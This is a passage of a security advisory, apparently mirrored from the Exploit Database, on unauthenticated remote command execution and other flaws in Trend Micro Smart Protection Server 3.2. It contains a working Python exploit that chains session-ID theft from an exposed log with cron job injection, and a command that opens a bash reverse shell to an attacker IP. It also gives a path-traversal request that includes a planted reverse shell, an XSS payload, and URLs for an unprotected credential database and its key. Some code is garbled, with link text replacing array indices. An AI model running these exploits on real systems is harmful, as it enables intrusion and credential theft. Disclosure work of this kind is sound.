## 3. Vulnerability Description

Trend Micro's website states that:

Trend Micro Smart Protection Server [(http://cwe.mitre.org/data/definitions/532.html)(https://www.coresecurity.com#SPS)] is a next-generation, in-the-cloud based, advanced protection solution. At the core of this solution is an advanced scanning architecture that leverages malware prevention signatures that are stored in-the-cloud. This solution leverages file reputation and Web reputation technology to detect security risks. The technology works by off loading a large number of malware prevention signatures and lists that were previously stored on endpoints to Trend Micro Smart Protection Server.

Multiple vulnerabilities were found in the Smart Protection Server's Administration UI that would allow a remote unauthenticated attacker to execute arbitrary commands on the system.

## 4. Vulnerable Packages

* Trend Micro Smart Protection Server 3.2 (Build 1085)

Other products and versions might be affected, but they were not tested.

## 5. Vendor Information, Solutions and Workarounds

Trend Micro published the following patches:

* TMSPS3.0 - Critical Patch B1354 ([link](http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4556®s=NABU&lang_loc=1#fragment-4628))
* TMSPS3.1 - Critical Patch B1057 ([link](http://downloadcenter.trendmicro.com/index.php?clk=tbl&clkval=4974®s=NABU&lang_loc=1#fragment-5030))

## 6. Credits

These vulnerabilities were discovered and researched by Leandro Barragan and Maximiliano Vidal from Core Security Consulting Services. The publication of this advisory was coordinated by Alberto Solino from Core Advisories Team.

## 7. Technical Description / Proof of Concept Code

In section 7.1 we describe how an unauthenticated attacker could get a session token to perform authenticated requests against the application.
Sections 7.2 and 7.3 describe two vectors to achieve remote command execution in the context of the Web application.
Several public privilege escalation vulnerabilities exist that are still unpatched. In combination with the aforementioned vulnerabilities a remote unauthenticated attacker would be able to execute arbitrary system commands with root privileges.
Sections 7.4 and 7.5 cover other common Web application vulnerabilities found in the product's console.

### 7.1 Session hijacking via log file disclosure

[[CVE-2017-11398](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-11398)] The application stores diagnostic logs in the /widget/repository/log/diagnostic.log file. Performing a login or some basic browsing will write several entries with the following format:

```
2017-08-18 17:00:38,468,INFO,rti940901j0556161dudhj6805,null,
Notice: Undefined index: param in /var/www/AdminUI/widget/inc/class/common/db/GenericDao.php on line 218
```

Each log entry leaks the associated session ID next to the log alert level and can be accessed via HTTP without authenticating to the Web application. Therefore, an unauthenticated attacker can grab this file and hijack active user sessions to perform authenticated requests.

### 7.2 Remote command execution via cron job injection

[[CVE-2017-14094](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-14094)] The script admin_update_program.php is responsible for creating a cron job when software updates are scheduled. The HTTP request contains several parameters that are used without sanitization as part of the cron job created at /var/spool/cron/webserv. We will target the hidTimingMin parameter.

File /var/www/AdminUI/php/admin_update_program.php:

```
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    [...]

    $arr_au['Program']['AUScheduleTimingMin']= isset($_POST["hidTimingMin"])?$_POST["hidTimingMin"]:"0";

    [...]

    if ( $arr_au['Program']['UseAUSchedule'] == "1"){
        if ( $arr_au['Program']['AUScheduleType'] == "0" ){
            $crontab->setDateParams($arr_au['Program']['AUScheduleTimingMin'], $arr_au['Program']['AUScheduleTimingHour'], "*", "*", "*");
        }else {
            $crontab->setDateParams($arr_au['Program']['AUScheduleTimingMin'], $arr_au['Program']['AUScheduleTimingHour'], "*", "*", $arr_au['Program']['AUScheduleTimingDay']);
        }
        $crontab->setCommand("/usr/tmcss/bin/UpdateManage.exe --Program --Schedule > /dev/null 2>&1");
        $crontab->saveCronFile();
    }
    if(! $crontab->addToCrontab()){
        header( 'Location: admin_update_program.php?status=savecrontaberror&sid='.$session_name ) ;
        exit;
    }
```

File /var/www/AdminUI/php/inc/crontab.php:

```
function setDateParams($min=NULL, $hour=NULL, $day=NULL, $month=NULL, $dayofweek=NULL){
    if($min=="0")
        $this->minute=0;
    elseif($min)
        $this->minute=$min;
    else
        $this->minute="*";

    if($hour=="0")
        $this->hour=0;
    elseif($hour)
        $this->hour=$hour;
    else
        $this->hour="*";
    $this->month=($month) ? $month : "*";
    $this->day=($day) ? $day : "*";
    $this->dayofweek=($dayofweek != NULL) ? $dayofweek : "*";
}

function saveCronFile(){
    $command=$this->minute." ".$this->hour." ".$this->day." ".$this->month." ".$this->dayofweek." ".$this->command."n";
    if(!fwrite($this->handle, $command))
        return true;
    else
        return false;
}

function addToCrontab(){
    if(!$this->filename)
        exit('No name specified for cron file');
        $data=array();
        exec("crontab ".escapeshellarg($this->directory.$this->filename),$data,$ret);

        if($ret==0)
            return true;
        else
            return false;
}
```

The following python script creates a cron job that will run an arbitrary command on every minute. It also leverages the session hijacking vulnerability described in 7.1 to bypass the need of authentication.

```
#!/usr/bin/env python

import requests
import sys

def exploit(host, port, command):
    session_id = get_session_id(host, port)
    print "[+] Obtained session id %s" % session_id
    execute_command(session_id, host, port, command)

def get_session_id(host, port):
    url = "https://%s:%d/widget/repository/log/diagnostic.log" % (host, port)
    r = requests.get(url, verify=False)
    for line in r.text.split('n')[::-1]:
        if "INFO" in line or "ERROR" in line:
            return line.split(',')(http://cwe.mitre.org/data/definitions/98.html)

def execute_command(session_id, host, port, command):
    print "[+] Executing command '%s' on %s:%d" % (command, host, port)
    url = "https://%s:%d/php/admin_update_program.php?sid=%s" % (host, port, session_id)
    multipart_data = {
        "ComponentSchedule": "on",
        "ComponentScheduleOS": "on",
        "ComponentScheduleService": "on",
        "ComponentScheduleWidget": "on",
        "useAUSchedule": "on",
        "auschedule_setting": "1",
        "update_method": "1",
        "update_method3": "on",
        "userfile": "",
        "sid": session_id,
        "hidComponentScheduleOS": "1",
        "hidComponentScheduleService": "1",
        "hidComponentScheduleWidget": "1",
        "hidUseAUSchedule": "1",
        "hidScheduleType": "1",
        "hidTimingDay": "2",
        "hidTimingHour": "2",
        "hidTimingMin": "* * * * * %s #" % command,
        "hidUpdateOption": "1",
        "hidUpdateNowFlag": ""
    }
    r = requests.post(url, data=multipart_data, cookies={session_id: session_id}, verify=False)

    if "MSG_UPDATE_UPDATE_SCHEDULE" in r.text:
        print "[+] Cron job added, enjoy!"
    else:
        print "[-] Session has probably timed out, try again later!"

if __name__ == "__main__":
    exploit(sys.argv(http://cwe.mitre.org/data/definitions/532.html), int(sys.argv(http://cwe.mitre.org/data/definitions/78.html)), sys.argv(http://cwe.mitre.org/data/definitions/98.html))
```

The following proof of concept opens a reverse shell to the attacker's machine.

```
$ python coso.py 192.168.45.186 4343 'bash -i >& /dev/tcp/192.168.45.80/8888 0>&1'
[+] Obtained session id q514un6ru6stcpf3k0n4putbd3

bash: no job control in this shell
[webserv@ localhost ~]$
```

### 7.3 Remote command execution via local file inclusion

[[CVE-2017-14095](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-14095)] The /widget/inc/widget_package_manager.php script passes user provided input to the PHP require_once function without sanitization. However, there are some restrictions that need to be overcome in order to include arbitrary files, as the application appends PoolManager.php at the end of the filename.

File /var/www/AdminUI/widget/inc/widget_package_manager.php:

```
switch($widgetRequest['act']){
    case "check":
    try{
            // $strUpdateType = widget, configure_widget_and_widget_component
            $strUpdateType = isset($widgetRequest['update_type']) ? $widgetRequest['update_type'] : 'widget';
            $strFuncName = 'is'.WF::getTypeFactory()->getString()->getUpperCamelCase($strUpdateType).'Update';
            $isUpdate = WF::getWidgetPoolFactory()->getWidgetPoolManager($strUpdateType)->$strFuncName();
            [...]
```

File /var/www/AdminUI/widget/inc/class/widgetPool/WidgetPoolFactory.abstract.php:

```
public function getWidgetPoolManager($strUpdateType = 'widget'){
    if(! isset(self::$instance[__FUNCTION__][$strUpdateType])){
        $strFileName = $this->objFramework->getTypeFactory()->getString()->getUpperCamelCase($strUpdateType);
        require_once (self::getDirnameFile() . '/widget/'.$strFileName.'PoolManager.php');
        $strClassName = 'WF'.$strFileName.'PoolManager';
        self::$instance[__FUNCTION__][$strUpdateType] = new $strClassName($this->objFramework);
    }
    return self::$instance[__FUNCTION__][$strUpdateType];
}
```

One way for an attacker to place an arbitrary file on the system is to abuse the update process that can be managed from the same product console.

Files downloaded from alternate update sources are stored in the /var/tmcss/activeupdate directory. An attacker can setup a fake update server and trigger an update from it to download the malicious archive.

As an example, we have packed a reverse shell named rshellPoolManager.php into the bf1747402402.zip archive. The following server.ini would instruct the application to download the archive and uncompress it inside /var/tmcss/activeupdate:

```
; =======================================
; ActiveUpdate 1.2 US
;
; Filename: Server.ini
;
; New Format AU 1.8
;
; Last modified by AUJP1 10/14/2015
; =======================================

[Common]
Version=1.2
CertExpireDate=Jul 28 08:52:40 2019 GMT

[Server]
AvailableServer=1
Server.1=http://<serverIP>:1080/
AltServer=http://<serverIP>:1080/
Https=http://<serverIP>:1080/

[PATTERN]
P.48040039=pattern/bf1747402402.zip,1747402402,257
```

After triggering an update from the Web console, the PHP script is written to the expected location.

```
[root@ localhost activeupdate]# ls -lha /var/tmcss/activeupdate/ | grep php
-rw-r--r--. 1 webserv webserv 66 ago 25 22:59 rshellPoolManager.php
```

The final step is to include the script and execute our payload.

```
POST /widget/inc/widget_package_manager.php?sid=dj0efdmskngvt4lbhakgc6cru7 HTTP/1.1
Host: 192.168.45.186:4343

Connection: close

{"act": "check", "update_type": "../../../../../../../../../var/tmcss/activeupdate/rshell"}
```

Steven Seeley and Roberto Suggi Liverani presented various privilege escalation vectors to move from webserv to root on their presentation "I Got 99 Trends and a # Is All Of Them". Based on our testing the attacks remain unpatched, so we did not try to find additional ways to escalate privileges.

### 7.4 Stored cross-site scripting

[[CVE-2017-14096](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-14096)] The ru parameter of the wcs_bwlists_handler.php script is vulnerable to cross-site scripting. This endpoint is used to manage user defined URLs.

After the rule is inserted, the payload will be executed every time the user opens the user defined URLs section.

The following proof of concept stores code to open an alert box.

```
https://<serverIP>:4343/php/wcs_bwlists_handler.php?sid=2f03bf97fc4912ee&req=mgmt_insert&st=1&ac=0&ru=http%3A%2F%2F%3Cscript%3Ealert(1)%3C%2Fscript%3E&rt=3&ipt=0&ip4=&ip4m=128&cn=&dn=
```

### 7.5 Improper access control

[[CVE-2017-14097](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-14097)] The product console includes widgets that can be used to monitor other servers. Credentials to access the servers being monitored, widget logs and other information reside on a SQLite database which can be accessed without authentication at the following URL:

```
https://<serverIP>:4343/widget/repository/db/sqlite/tmwf.db
```

The credentials are stored using AES256 with a dynamic key. However, the key is also placed inside the Web server directories and available for download without authentication.

```
https://<serverIP>:4343/widget/repository/inc/class/common/crypt/crypt.key
```

This would allow an attacker to decrypt the contents of the database, rendering the encryption mechanism useless.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
